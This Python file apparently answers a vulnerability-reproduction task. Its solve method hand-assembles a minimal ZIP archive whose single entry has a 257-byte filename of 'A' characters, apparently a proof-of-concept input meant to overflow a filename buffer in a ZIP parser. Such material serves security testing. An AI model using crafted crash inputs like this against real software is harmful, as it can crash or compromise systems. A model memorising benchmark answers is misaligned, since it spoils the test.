import struct
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        fname_len = 257
        fname = b"A" * fname_len

        # Local file header
        local_sig = 0x04034B50
        version_needed = 20
        gp_flag = 0
        comp_method = 0
        mod_time = 0
        mod_date = 0
        crc32 = 0
        comp_size = 0
        uncomp_size = 0
        extra = b""

        local_hdr = struct.pack(
            "<IHHHHHIIIHH",
            local_sig,
            version_needed,
            gp_flag,
            comp_method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            fname_len,
            len(extra),
        ) + fname + extra

        file_data = b""

        # Central directory header
        cd_sig = 0x02014B50
        version_made_by = 20
        file_comment = b""
        disk_start = 0
        internal_attr = 0
        external_attr = 0
        local_hdr_offset = 0

        central_dir = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            cd_sig,
            version_made_by,
            version_needed,
            gp_flag,
            comp_method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            fname_len,
            0,  # extra len
            0,  # comment len
            disk_start,
            internal_attr,
            external_attr,
            local_hdr_offset,
        ) + fname + file_comment

        # End of central directory
        eocd_sig = 0x06054B50
        disk_no = 0
        cd_start_disk = 0
        entries_this_disk = 1
        total_entries = 1
        cd_size = len(central_dir)
        cd_offset = len(local_hdr) + len(file_data)
        zip_comment = b""

        eocd = struct.pack(
            "<IHHHHIIH",
            eocd_sig,
            disk_no,
            cd_start_disk,
            entries_this_disk,
            total_entries,
            cd_size,
            cd_offset,
            len(zip_comment),
        ) + zip_comment

        return local_hdr + file_data + central_dir + eocd